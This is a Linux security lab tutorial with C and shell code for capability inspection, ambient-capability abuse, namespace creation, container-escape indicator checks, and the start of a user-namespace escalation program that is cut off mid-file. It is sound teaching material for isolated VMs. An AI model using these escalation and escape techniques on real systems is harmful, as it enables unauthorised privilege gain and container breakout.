# Tutorial: Capabilities, Namespaces, Cgroups, LSMs, and Kernel Memory Security — Hands-On Lab

> **Companion to:** `domain2_chapter2C_caps_ns_lsm.md`
> **Prerequisites:** Tutorials 2A (process memory) and 2B (syscall/seccomp/ptrace). Working knowledge of Linux administration, C compilation, container runtimes.

---

## Lab Environment Setup

### Hardware / VM Requirements

| VM | Role | Specs | OS |
|----|------|-------|----|
| **VM-ATTACK** | Offensive exercises, container escape, capability abuse | 4 vCPU, 8 GB RAM, 40 GB disk, nested virtualization enabled | Ubuntu 22.04+ or Fedora 38+ |
| **VM-DEFENSE** | Detection, hardening, LSM policy development | 4 vCPU, 8 GB RAM, 40 GB disk | Ubuntu 22.04+ (AppArmor) **or** Fedora 38+ (SELinux) |

> Both VMs should be **isolated** from production networks. Nested virtualization (`vmx`/`svm` CPU flags) is required for some namespace exercises.

### Tool Installation — VM-ATTACK

```bash
#!/bin/bash
# install_attack_tools.sh — Run as root on VM-ATTACK

set -euo pipefail

apt-get update && apt-get install -y \
    build-essential gcc g++ make \
    libcap-dev libcap-ng-dev libcap-ng-utils \
    libseccomp-dev seccomp \
    linux-headers-$(uname -r) \
    docker.io containerd runc \
    python3 python3-pip python3-venv \
    strace ltrace gdb \
    util-linux iproute2 iptables nftables \
    bpftrace bpfcc-tools linux-tools-$(uname -r) \
    cgroup-tools \
    attr acl \
    jq curl wget git

# Python packages
pip3 install --break-system-packages pwntools capstone keystone-engine

# seccomp-tools (Ruby)
apt-get install -y ruby ruby-dev
gem install seccomp-tools

# Install amicontained for container inspection
curl -fsSL -o /usr/local/bin/amicontained \
    https://github.com/genuinetools/amicontained/releases/latest/download/amicontained-linux-amd64
chmod +x /usr/local/bin/amicontained

# Verify Docker is running
systemctl enable --now docker

# Enable user namespaces for rootless exercises
echo "kernel.unprivileged_userns_clone=1" > /etc/sysctl.d/99-userns-lab.conf
sysctl -p /etc/sysctl.d/99-userns-lab.conf 2>/dev/null || true

echo "[+] VM-ATTACK setup complete"
```

### Tool Installation — VM-DEFENSE

```bash
#!/bin/bash
# install_defense_tools.sh — Run as root on VM-DEFENSE

set -euo pipefail

apt-get update && apt-get install -y \
    build-essential gcc make \
    libcap-dev libcap-ng-dev libcap-ng-utils \
    auditd audispd-plugins \
    bpftrace bpfcc-tools linux-tools-$(uname -r) \
    apparmor apparmor-utils apparmor-profiles apparmor-profiles-extra \
    docker.io containerd \
    python3 python3-pip python3-venv \
    jq curl wget git \
    cgroup-tools \
    attr acl

# Install Falco
curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | \
    gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] \
    https://download.falco.org/packages/deb stable main" > \
    /etc/apt/sources.list.d/falcosecurity.list
apt-get update && apt-get install -y falco || echo "[!] Falco install may require kernel headers"

# Install Tetragon
helm repo add cilium https://helm.cilium.io 2>/dev/null || true
# For non-K8s: use standalone binary
curl -fsSL https://github.com/cilium/tetragon/releases/latest/download/tetra-linux-amd64.tar.gz | \
    tar xz -C /usr/local/bin/ 2>/dev/null || echo "[!] Tetragon standalone install - check releases page"

# For SELinux exercises on Fedora:
# dnf install -y selinux-policy-devel policycoreutils-python-utils \
#     setools-console setroubleshoot-server

systemctl enable --now auditd
systemctl enable --now docker

echo "[+] VM-DEFENSE setup complete"
```

### Kernel Configuration Verification

```bash
#!/bin/bash
# verify_kernel_config.sh — Check kernel features required for lab exercises

echo "=== Kernel Configuration for Caps/NS/LSM Lab ==="
CONFIG="/boot/config-$(uname -r)"
[ ! -f "$CONFIG" ] && CONFIG="/proc/config.gz" && echo "(using /proc/config.gz)"

check_config() {
    local opt="$1"
    local desc="$2"
    if [ -f "/proc/config.gz" ]; then
        val=$(zcat /proc/config.gz 2>/dev/null | grep "^${opt}=" | head -1)
    else
        val=$(grep "^${opt}=" "$CONFIG" 2>/dev/null | head -1)
    fi
    if [ -n "$val" ]; then
        printf "  [OK]  %-45s %s\n" "$opt" "$desc"
    else
        printf "  [--]  %-45s %s\n" "$opt" "$desc"
    fi
}

echo ""
echo "--- Capabilities ---"
check_config "CONFIG_SECURITY" "Security subsystem"
check_config "CONFIG_SECURITY_CAPABILITIES" "POSIX capabilities (legacy)"

echo ""
echo "--- Namespaces ---"
check_config "CONFIG_NAMESPACES" "Namespace support"
check_config "CONFIG_USER_NS" "User namespaces"
check_config "CONFIG_PID_NS" "PID namespaces"
check_config "CONFIG_NET_NS" "Network namespaces"
check_config "CONFIG_UTS_NS" "UTS namespaces"
check_config "CONFIG_IPC_NS" "IPC namespaces"
check_config "CONFIG_CGROUP_NS" "Cgroup namespaces"
check_config "CONFIG_TIME_NS" "Time namespaces"

echo ""
echo "--- Cgroups ---"
check_config "CONFIG_CGROUPS" "Cgroup support"
check_config "CONFIG_CGROUP_V1" "Cgroups v1"
check_config "CONFIG_MEMCG" "Memory cgroup"
check_config "CONFIG_CGROUP_PIDS" "PID cgroup"
check_config "CONFIG_CGROUP_DEVICE" "Device cgroup"
check_config "CONFIG_CGROUP_FREEZER" "Freezer cgroup"
check_config "CONFIG_CGROUP_BPF" "BPF cgroup"

echo ""
echo "--- LSMs ---"
check_config "CONFIG_SECURITY_SELINUX" "SELinux"
check_config "CONFIG_SECURITY_APPARMOR" "AppArmor"
check_config "CONFIG_SECURITY_SMACK" "Smack"
check_config "CONFIG_SECURITY_TOMOYO" "TOMOYO"
check_config "CONFIG_SECURITY_LANDLOCK" "Landlock"
check_config "CONFIG_SECURITY_YAMA" "Yama"
check_config "CONFIG_SECURITY_LOCKDOWN_LSM" "Lockdown"
check_config "CONFIG_BPF_LSM" "BPF LSM"
check_config "CONFIG_IMA" "IMA"
check_config "CONFIG_EVM" "EVM"

echo ""
echo "--- Kernel Memory Security ---"
check_config "CONFIG_KFENCE" "KFENCE"
check_config "CONFIG_KASAN" "KASAN"
check_config "CONFIG_STACKPROTECTOR" "Stack protector"
check_config "CONFIG_STACKPROTECTOR_STRONG" "Stack protector (strong)"
check_config "CONFIG_VMAP_STACK" "Vmapped stacks"
check_config "CONFIG_STRICT_KERNEL_RWX" "Strict kernel RWX"
check_config "CONFIG_STRICT_MODULE_RWX" "Strict module RWX"
check_config "CONFIG_INIT_ON_ALLOC_DEFAULT_ON" "Init on alloc"
check_config "CONFIG_INIT_ON_FREE_DEFAULT_ON" "Init on free"
check_config "CONFIG_RANDOMIZE_KSTACK_OFFSET" "Randomize kstack offset"

echo ""
echo "--- Active LSMs ---"
cat /sys/kernel/security/lsm 2>/dev/null || echo "(cannot read LSM list)"

echo ""
echo "--- Current sysctl security settings ---"
for s in \
    kernel.yama.ptrace_scope \
    kernel.unprivileged_bpf_disabled \
    kernel.dmesg_restrict \
    kernel.kptr_restrict \
    kernel.perf_event_paranoid \
    user.max_user_namespaces \
    fs.protected_symlinks \
    fs.protected_hardlinks; do
    val=$(sysctl -n "$s" 2>/dev/null || echo "N/A")
    printf "  %-45s = %s\n" "$s" "$val"
done
```

---

## PART A: OFFENSIVE (Attack Scenarios)

### Exercise 1: Capability Inspection, Manipulation, and the execve Transformation

**Objective:** Understand Linux capability sets in practice — read them from `/proc`, manipulate them with `capget`/`capset` and `prctl`, observe how capabilities transform across `execve`, and demonstrate ambient capability inheritance.

#### Step 1.1 — Capability Set Inspector (C)

Create `cap_inspector.c`:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <linux/capability.h>
#include <errno.h>

static const char *cap_names[] = {
    [0]  = "CAP_CHOWN",           [1]  = "CAP_DAC_OVERRIDE",
    [2]  = "CAP_DAC_READ_SEARCH", [3]  = "CAP_FOWNER",
    [4]  = "CAP_FSETID",          [5]  = "CAP_KILL",
    [6]  = "CAP_SETGID",          [7]  = "CAP_SETUID",
    [8]  = "CAP_SETPCAP",         [9]  = "CAP_LINUX_IMMUTABLE",
    [10] = "CAP_NET_BIND_SERVICE",[11] = "CAP_NET_BROADCAST",
    [12] = "CAP_NET_ADMIN",       [13] = "CAP_NET_RAW",
    [14] = "CAP_IPC_LOCK",        [15] = "CAP_IPC_OWNER",
    [16] = "CAP_SYS_MODULE",      [17] = "CAP_SYS_RAWIO",
    [18] = "CAP_SYS_CHROOT",      [19] = "CAP_SYS_PTRACE",
    [20] = "CAP_SYS_PACCT",       [21] = "CAP_SYS_ADMIN",
    [22] = "CAP_SYS_BOOT",        [23] = "CAP_SYS_NICE",
    [24] = "CAP_SYS_RESOURCE",    [25] = "CAP_SYS_TIME",
    [26] = "CAP_SYS_TTY_CONFIG",  [27] = "CAP_MKNOD",
    [28] = "CAP_LEASE",           [29] = "CAP_AUDIT_WRITE",
    [30] = "CAP_AUDIT_CONTROL",   [31] = "CAP_SETFCAP",
    [32] = "CAP_MAC_OVERRIDE",    [33] = "CAP_MAC_ADMIN",
    [34] = "CAP_SYSLOG",          [35] = "CAP_WAKE_ALARM",
    [36] = "CAP_BLOCK_SUSPEND",   [37] = "CAP_AUDIT_READ",
    [38] = "CAP_PERFMON",         [39] = "CAP_BPF",
    [40] = "CAP_CHECKPOINT_RESTORE",
};
#define CAP_LAST 40

static void decode_caps(const char *label, unsigned long long mask) {
    printf("  %s: 0x%016llx\n", label, mask);
    for (int i = 0; i <= CAP_LAST; i++) {
        if (mask & (1ULL << i))
            printf("    [%2d] %s\n", i, cap_names[i]);
    }
}

static unsigned long long read_cap_hex(const char *line) {
    unsigned long long val = 0;
    sscanf(line, "%llx", &val);
    return val;
}

void inspect_pid(pid_t pid) {
    char path[256], buf[4096];
    snprintf(path, sizeof(path), "/proc/%d/status", pid == 0 ? getpid() : pid);
    FILE *f = fopen(path, "r");
    if (!f) { perror(path); return; }

    printf("\n=== Capabilities for PID %d ===\n", pid == 0 ? getpid() : pid);

    unsigned long long cap_inh = 0, cap_prm = 0, cap_eff = 0;
    unsigned long long cap_bnd = 0, cap_amb = 0;

    while (fgets(buf, sizeof(buf), f)) {
        if (strncmp(buf, "CapInh:", 7) == 0)
            cap_inh = read_cap_hex(buf + 8);
        else if (strncmp(buf, "CapPrm:", 7) == 0)
            cap_prm = read_cap_hex(buf + 8);
        else if (strncmp(buf, "CapEff:", 7) == 0)
            cap_eff = read_cap_hex(buf + 8);
        else if (strncmp(buf, "CapBnd:", 7) == 0)
            cap_bnd = read_cap_hex(buf + 8);
        else if (strncmp(buf, "CapAmb:", 7) == 0)
            cap_amb = read_cap_hex(buf + 8);
    }
    fclose(f);

    decode_caps("Effective   (E)", cap_eff);
    decode_caps("Permitted   (P)", cap_prm);
    decode_caps("Inheritable (I)", cap_inh);
    decode_caps("Bounding    (B)", cap_bnd);
    decode_caps("Ambient     (A)", cap_amb);

    /* Securebits */
    unsigned long sb = prctl(PR_GET_SECUREBITS);
    if (sb >= 0) {
        printf("\n  Securebits: 0x%lx\n", sb);
        if (sb & 0x01) printf("    SECBIT_NOROOT\n");
        if (sb & 0x02) printf("    SECBIT_NOROOT_LOCKED\n");
        if (sb & 0x04) printf("    SECBIT_NO_SETUID_FIXUP\n");
        if (sb & 0x08) printf("    SECBIT_NO_SETUID_FIXUP_LOCKED\n");
        if (sb & 0x10) printf("    SECBIT_KEEP_CAPS\n");
        if (sb & 0x20) printf("    SECBIT_KEEP_CAPS_LOCKED\n");
        if (sb & 0x40) printf("    SECBIT_NO_CAP_AMBIENT_RAISE\n");
        if (sb & 0x80) printf("    SECBIT_NO_CAP_AMBIENT_RAISE_LOCKED\n");
    }

    /* NO_NEW_PRIVS */
    int nnp = prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0);
    printf("  NO_NEW_PRIVS: %s\n", nnp > 0 ? "SET" : "not set");

    /* Dumpable */
    int dmp = prctl(PR_GET_DUMPABLE);
    printf("  Dumpable: %d\n", dmp);
}

/* Demonstrate raw capset — raise a cap into effective */
void raise_cap_demo(int cap_num) {
    struct __user_cap_header_struct hdr = {
        .version = _LINUX_CAPABILITY_VERSION_3,
        .pid = 0,
    };
    struct __user_cap_data_struct data[2] = {};

    if (capget(&hdr, data) < 0) {
        perror("capget");
        return;
    }

    int idx = cap_num / 32;
    int bit = cap_num % 32;

    /* Check if cap is in permitted set */
    if (!(data[idx].permitted & (1u << bit))) {
        printf("[!] CAP %d (%s) not in permitted set — cannot raise\n",
               cap_num, cap_num <= CAP_LAST ? cap_names[cap_num] : "?");
        return;
    }

    printf("[*] Raising CAP %d (%s) into effective set\n",
           cap_num, cap_num <= CAP_LAST ? cap_names[cap_num] : "?");

    data[idx].effective |= (1u << bit);

    if (capset(&hdr, data) < 0) {
        perror("capset");
        return;
    }
    printf("[+] Success — cap raised into effective set\n");
}

int main(int argc, char *argv[]) {
    if (argc > 1 && strcmp(argv[1], "--raise") == 0 && argc > 2) {
        int cap = atoi(argv[2]);
        raise_cap_demo(cap);
        inspect_pid(0);
    } else if (argc > 1) {
        inspect_pid(atoi(argv[1]));
    } else {
        inspect_pid(0);
    }
    return 0;
}
```

**Build and test:**

```bash
gcc -o cap_inspector cap_inspector.c -Wall
# Inspect own capabilities (as regular user)
./cap_inspector
# Inspect PID 1 (as root)
sudo ./cap_inspector 1
# Compare: full caps on PID 1 vs restricted on user shell
```

**Expected output (user shell):**

```
=== Capabilities for PID 12345 ===
  Effective   (E): 0x0000000000000000
  Permitted   (P): 0x0000000000000000
  Inheritable (I): 0x0000000000000000
  Bounding    (B): 0x000001ffffffffff
    [ 0] CAP_CHOWN
    [ 1] CAP_DAC_OVERRIDE
    ...all 41 capabilities listed...
  Ambient     (A): 0x0000000000000000
  Securebits: 0x0
  NO_NEW_PRIVS: not set
  Dumpable: 1
```

#### Step 1.2 — The execve Transformation in Action

Create `execve_caps_demo.c` — demonstrates how capability sets change across `execve`:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <linux/capability.h>

static unsigned long long read_proc_cap(const char *name) {
    char buf[4096], key[32];
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return 0;
    snprintf(key, sizeof(key), "%s:", name);
    unsigned long long val = 0;
    while (fgets(buf, sizeof(buf), f)) {
        if (strncmp(buf, key, strlen(key)) == 0) {
            sscanf(buf + strlen(key), "%llx", &val);
            break;
        }
    }
    fclose(f);
    return val;
}

static void print_status(const char *phase) {
    printf("\n--- %s (PID %d) ---\n", phase, getpid());
    printf("  CapEff: 0x%016llx\n", read_proc_cap("CapEff"));
    printf("  CapPrm: 0x%016llx\n", read_proc_cap("CapPrm"));
    printf("  CapInh: 0x%016llx\n", read_proc_cap("CapInh"));
    printf("  CapAmb: 0x%016llx\n", read_proc_cap("CapAmb"));
    printf("  CapBnd: 0x%016llx\n", read_proc_cap("CapBnd"));
    printf("  UID=%d  EUID=%d\n", getuid(), geteuid());
}

int main(int argc, char *argv[]) {
    if (argc > 1 && strcmp(argv[1], "--child") == 0) {
        /* We were exec'd — show caps after transformation */
        print_status("AFTER execve (child binary)");
        return 0;
    }

    print_status("BEFORE fork/exec (parent)");

    /* Demonstrate ambient capability passing */
    /* First: raise CAP_NET_BIND_SERVICE (10) into inheritable + ambient */
    /* This requires the cap to be in permitted already (needs root or setcap) */

    struct __user_cap_header_struct hdr = {
        .version = _LINUX_CAPABILITY_VERSION_3, .pid = 0 };
    struct __user_cap_data_struct data[2] = {};
    capget(&hdr, data);

    /* Check if CAP_NET_BIND_SERVICE (10) is in permitted */
    if (data[0].permitted & (1u << 10)) {
        /* Add to inheritable */
        data[0].inheritable |= (1u << 10);
        if (capset(&hdr, data) == 0) {
            /* Raise into ambient */
            if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, 10, 0, 0) == 0) {
                printf("\n[+] Raised CAP_NET_BIND_SERVICE into ambient set\n");
            }
        }
        print_status("AFTER ambient raise (parent)");
    } else {
        printf("\n[!] CAP_NET_BIND_SERVICE not in permitted — run as root or with setcap\n");
    }

    /* Fork and exec self with --child to show transformation */
    pid_t pid = fork();
    if (pid == 0) {
        execl(argv[0], argv[0], "--child", NULL);
        perror("execl");
        _exit(1);
    }
    waitpid(pid, NULL, 0);

    return 0;
}
```

**Build and test:**

```bash
gcc -o execve_caps_demo execve_caps_demo.c -Wall

# Run as regular user — no caps in permitted, ambient raise fails
./execve_caps_demo

# Run as root — caps transform across exec
sudo ./execve_caps_demo

# Set file capability and run as user
sudo setcap cap_net_bind_service+eip ./execve_caps_demo
./execve_caps_demo
# Observe: the file cap grants the capability across exec

# Clean up
sudo setcap -r ./execve_caps_demo
```

#### Step 1.3 — Ambient Capability Abuse

Create `ambient_abuse.c` — passes CAP_NET_BIND_SERVICE to an arbitrary child binary without file capabilities:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <string.h>
#include <errno.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <binary-to-exec> [args...]\n", argv[0]);
        return 1;
    }

    /* The parent must have the cap in permitted + inheritable */
    struct __user_cap_header_struct hdr = {
        .version = _LINUX_CAPABILITY_VERSION_3, .pid = 0 };
    struct __user_cap_data_struct data[2] = {};

    if (capget(&hdr, data) < 0) { perror("capget"); return 1; }

    /* Raise CAP_NET_BIND_SERVICE into inheritable */
    data[0].inheritable |= (1u << 10); /* CAP_NET_BIND_SERVICE */
    if (capset(&hdr, data) < 0) {
        fprintf(stderr, "capset (inheritable): %s\n", strerror(errno));
        fprintf(stderr, "Need CAP_NET_BIND_SERVICE in permitted set. Run with:\n");
        fprintf(stderr, "  sudo setcap cap_net_bind_service+eip %s\n", argv[0]);
        return 1;
    }

    /* Raise into ambient */
    if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, 10, 0, 0) < 0) {
        perror("PR_CAP_AMBIENT_RAISE");
        return 1;
    }

    printf("[+] Ambient CAP_NET_BIND_SERVICE set. Exec'ing: %s\n", argv[1]);

    /* Exec target binary — it inherits the ambient cap
       WITHOUT needing file capabilities on the target binary */
    execvp(argv[1], &argv[1]);
    perror("execvp");
    return 1;
}
```

**Build and demonstrate:**

```bash
gcc -o ambient_abuse ambient_abuse.c -Wall
sudo setcap cap_net_bind_service+eip ./ambient_abuse

# Pass the cap to python3 (which has no file capabilities):
./ambient_abuse python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.bind(('0.0.0.0', 80))
    print('[+] Bound to port 80 — ambient cap inherited!')
    s.close()
except PermissionError:
    print('[-] Permission denied — cap not inherited')
"

# Verify: python3 itself has no file capabilities
getcap $(which python3)
# (empty — no file caps, yet it bound port 80 via ambient inheritance)
```

#### Step 1.4 — Bounding Set Drop and Permanent Privilege Restriction

Create `bset_drop.c`:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <linux/capability.h>

int main(void) {
    printf("[*] Dropping dangerous capabilities from bounding set...\n");

    int dangerous[] = {
        21, /* CAP_SYS_ADMIN */
        16, /* CAP_SYS_MODULE */
        17, /* CAP_SYS_RAWIO */
        19, /* CAP_SYS_PTRACE */
    };
    const char *names[] = {
        "CAP_SYS_ADMIN", "CAP_SYS_MODULE",
        "CAP_SYS_RAWIO", "CAP_SYS_PTRACE",
    };

    for (int i = 0; i < 4; i++) {
        if (prctl(PR_CAPBSET_DROP, dangerous[i]) < 0)
            perror(names[i]);
        else
            printf("  [-] Dropped %s from bounding set\n", names[i]);
    }

    /* Set NO_NEW_PRIVS — prevents regaining caps via setuid/file caps */
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0)
        perror("PR_SET_NO_NEW_PRIVS");
    else
        printf("[+] NO_NEW_PRIVS set — no privilege escalation via exec\n");

    /* Verify: try to exec a setuid binary */
    printf("\n[*] Attempting to exec /usr/bin/sudo (should fail or lose caps)...\n");
    execl("/usr/bin/sudo", "sudo", "id", NULL);
    perror("execl sudo");
    return 0;
}
```

**Build and test:**

```bash
gcc -o bset_drop bset_drop.c -Wall
sudo ./bset_drop
# Observe: caps dropped from bounding set, sudo exec fails
# because NO_NEW_PRIVS prevents gaining privileges
```

**Verification:** After running `bset_drop`, check that the dropped caps cannot be regained:

```bash
# In a new shell spawned from the restricted process:
cat /proc/self/status | grep Cap
# CapBnd should be missing bits 16, 17, 19, 21
```

---

### Exercise 2: Namespace Creation, Enumeration, and Escape Techniques

**Objective:** Create and enter all 8 namespace types, enumerate namespace membership, demonstrate PID/mount/network namespace escapes, and exploit user namespace privilege escalation.

#### Step 2.1 — Comprehensive Namespace Creator

Create `ns_creator.c`:

```c
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

static void write_file(const char *path, const char *data) {
    int fd = open(path, O_WRONLY);
    if (fd < 0) return;
    write(fd, data, strlen(data));
    close(fd);
}

static void show_ns_info(void) {
    printf("\n--- Namespace Info (PID %d) ---\n", getpid());

    /* Read namespace inode numbers */
    const char *ns_types[] = {
        "cgroup", "ipc", "mnt", "net", "pid", "user", "uts", NULL
    };
    for (int i = 0; ns_types[i]; i++) {
        char path[256], link[256];
        snprintf(path, sizeof(path), "/proc/self/ns/%s", ns_types[i]);
        ssize_t n = readlink(path, link, sizeof(link) - 1);
        if (n > 0) {
            link[n] = '\0';
            printf("  %-8s → %s\n", ns_types[i], link);
        }
    }

    /* UID/GID info */
    printf("  uid=%d euid=%d gid=%d egid=%d\n",
           getuid(), geteuid(), getgid(), getegid());

    /* Hostname */
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    printf("  hostname=%s\n", hostname);
}

static int child_fn(void *arg) {
    pid_t parent_pid = *(pid_t *)arg;
    char buf[256];

    /* Set up UID/GID mapping for user namespace */
    snprintf(buf, sizeof(buf), "/proc/%d/setgroups", getpid());
    write_file(buf, "deny");
    snprintf(buf, sizeof(buf), "/proc/%d/uid_map", getpid());
    snprintf(buf, sizeof(buf), "0 %d 1", parent_pid);
    /* uid_map: map UID 0 inside to parent's UID outside */
    {
        char map[64];
        snprintf(map, sizeof(map), "0 %d 1", parent_pid);
        char mappath[256];
        snprintf(mappath, sizeof(mappath), "/proc/%d/uid_map", getpid());
        write_file(mappath, map);
        snprintf(mappath, sizeof(mappath), "/proc/%d/gid_map", getpid());
        snprintf(map, sizeof(map), "0 %d 1", parent_pid);
        write_file(mappath, map);
    }

    /* Set hostname in new UTS namespace */
    sethostname("ns-lab", 6);

    /* Mount new proc in new PID namespace */
    mount("", "/", NULL, MS_REC | MS_PRIVATE, NULL);
    mkdir("/tmp/ns_proc", 0755);
    mount("proc", "/tmp/ns_proc", "proc", 0, NULL);

    show_ns_info();

    printf("\n[+] Inside all new namespaces. Capabilities in user ns:\n");
    /* Read effective caps */
    FILE *f = fopen("/proc/self/status", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "Cap", 3) == 0)
                printf("  %s", line);
        }
        fclose(f);
    }

    printf("\n[*] Sleeping 30s so you can inspect from host...\n");
    printf("    Host: ls -la /proc/%d/ns/\n", getpid());
    sleep(30);

    umount("/tmp/ns_proc");
    return 0;
}

int main(void) {
    printf("=== Namespace Creator ===\n");
    show_ns_info();

    pid_t parent_uid = getuid();
    char *stack = malloc(1024 * 1024);
    if (!stack) { perror("malloc"); return 1; }

    printf("\n[*] Creating child in new user/mount/pid/net/uts/ipc namespaces...\n");

    int flags = CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWPID |
                CLONE_NEWNET | CLONE_NEWUTS | CLONE_NEWIPC |
                SIGCHLD;

    pid_t child = clone(child_fn, stack + 1024 * 1024, flags, &parent_uid);
    if (child < 0) {
        perror("clone");
        free(stack);
        return 1;
    }

    printf("[+] Child PID (host view): %d\n", child);

    /* Compare namespace inodes */
    printf("\n--- Namespace Comparison (host vs child) ---\n");
    const char *ns_types[] = { "user", "mnt", "pid", "net", "uts", "ipc", NULL };
    for (int i = 0; ns_types[i]; i++) {
        char self_path[256], child_path[256];
        char self_link[256], child_link[256];
        snprintf(self_path, sizeof(self_path), "/proc/self/ns/%s", ns_types[i]);
        snprintf(child_path, sizeof(child_path), "/proc/%d/ns/%s", child, ns_types[i]);
        ssize_t n1 = readlink(self_path, self_link, sizeof(self_link) - 1);
        ssize_t n2 = readlink(child_path, child_link, sizeof(child_link) - 1);
        if (n1 > 0 && n2 > 0) {
            self_link[n1] = '\0';
            child_link[n2] = '\0';
            printf("  %-6s: host=%s child=%s %s\n",
                   ns_types[i], self_link, child_link,
                   strcmp(self_link, child_link) == 0 ? "[SHARED]" : "[ISOLATED]");
        }
    }

    waitpid(child, NULL, 0);
    free(stack);
    return 0;
}
```

**Build and test:**

```bash
gcc -o ns_creator ns_creator.c -Wall
# Run as unprivileged user (user namespace allows this)
./ns_creator
```

**Expected output:** The child process shows UID 0 (root inside user namespace), different namespace inode numbers for all types, full capabilities within the user namespace, and a changed hostname.

#### Step 2.2 — Namespace Enumeration and Escape Detection

Create `ns_enum.sh`:

```bash
#!/bin/bash
# ns_enum.sh — Comprehensive namespace enumeration
# Run inside a container or namespace-isolated process

echo "============================================"
echo "   Namespace Enumeration & Escape Detection"
echo "============================================"

echo ""
echo "--- 1. Current namespace membership ---"
for ns in cgroup ipc mnt net pid user uts; do
    link=$(readlink /proc/self/ns/$ns 2>/dev/null || echo "N/A")
    printf "  %-8s: %s\n" "$ns" "$link"
done

echo ""
echo "--- 2. Comparison with host PID 1 ---"
SHARED=0
ISOLATED=0
for ns in cgroup ipc mnt net pid user uts; do
    self_ns=$(readlink /proc/self/ns/$ns 2>/dev/null)
    host_ns=$(readlink /proc/1/ns/$ns 2>/dev/null)
    if [ -z "$host_ns" ]; then
        printf "  %-8s: Cannot read host ns (isolated)\n" "$ns"
        ISOLATED=$((ISOLATED + 1))
    elif [ "$self_ns" = "$host_ns" ]; then
        printf "  %-8s: [!!] SHARED with host PID 1\n" "$ns"
        SHARED=$((SHARED + 1))
    else
        printf "  %-8s: [ok] Isolated\n" "$ns"
        ISOLATED=$((ISOLATED + 1))
    fi
done
echo ""
echo "  Summary: $SHARED shared, $ISOLATED isolated"
if [ "$SHARED" -gt 0 ]; then
    echo "  [!] WARNING: Shared namespaces may enable escape"
fi

echo ""
echo "--- 3. User namespace UID/GID mapping ---"
echo "  uid_map:"
cat /proc/self/uid_map 2>/dev/null | sed 's/^/    /'
echo "  gid_map:"
cat /proc/self/gid_map 2>/dev/null | sed 's/^/    /'

echo ""
echo "--- 4. Mount propagation analysis ---"
SHARED_MOUNTS=$(grep -c "shared:" /proc/self/mountinfo 2>/dev/null || echo 0)
echo "  Mounts with shared propagation: $SHARED_MOUNTS"
if [ "$SHARED_MOUNTS" -gt 0 ]; then
    echo "  [!] Shared mount propagation — potential escape vector"
    grep "shared:" /proc/self/mountinfo | head -5 | sed 's/^/    /'
fi

echo ""
echo "--- 5. Capability analysis ---"
for cap_line in CapEff CapPrm CapInh CapBnd CapAmb; do
    val=$(grep "^${cap_line}:" /proc/self/status 2>/dev/null | awk '{print $2}')
    printf "  %-7s: %s" "$cap_line" "$val"
    if [ "$val" = "000001ffffffffff" ]; then
        echo " [!!] ALL CAPABILITIES — privileged"
    elif [ "$val" = "0000000000000000" ]; then
        echo " (none)"
    else
        echo ""
    fi
done

echo ""
echo "--- 6. Container escape indicators ---"

# Docker socket
if [ -S /var/run/docker.sock ]; then
    echo "  [CRITICAL] Docker socket mounted at /var/run/docker.sock"
fi

# Host devices
for dev in /dev/sda /dev/sda1 /dev/vda /dev/vda1 /dev/nvme0n1; do
    [ -b "$dev" ] && echo "  [HIGH] Host block device accessible: $dev"
done

# /proc/1/root access
if [ -r /proc/1/root/etc/hostname ]; then
    echo "  [CRITICAL] Can read host /proc/1/root — PID ns shared"
    echo "    Host hostname: $(cat /proc/1/root/etc/hostname 2>/dev/null)"
fi

# Seccomp status
SECCOMP=$(grep "Seccomp:" /proc/self/status 2>/dev/null | awk '{print $2}')
case "$SECCOMP" in
    0) echo "  [HIGH] Seccomp DISABLED" ;;
    1) echo "  [ok] Seccomp strict mode" ;;
    2) echo "  [ok] Seccomp filter mode" ;;
esac

# AppArmor status
AA=$(cat /proc/self/attr/current 2>/dev/null)
if [ "$AA" = "unconfined" ]; then
    echo "  [HIGH] AppArmor unconfined"
elif [ -n "$AA" ]; then
    echo "  [ok] AppArmor profile: $AA"
fi

# Cgroup writable
if mount | grep -q "cgroup.*rw"; then
    echo "  [HIGH] Cgroup filesystem mounted read-write"
fi

echo ""
echo "--- 7. All namespaces on system (lsns) ---"
lsns 2>/dev/null | head -20 || echo "  (lsns not available)"
```

#### Step 2.3 — User Namespace Privilege Escalation

Create `userns_escape.c` — demonstrates gaining capabilities via user namespace:

```c
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>

static void write_to(const char *path, const char *data) {
    int fd = open(path, O_WRONLY);
    if (fd >= 0) { write(fd, data, strlen(data)); close(fd); }
}

int main(void) {
    printf("[*] Current UID: %d (unprivileged)\n", getuid());
    printf("[*] Creating user namespace + mount namespace...\n");

    uid_t orig_uid = getuid();
    gid_t orig_gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) {
        perror("unshare");
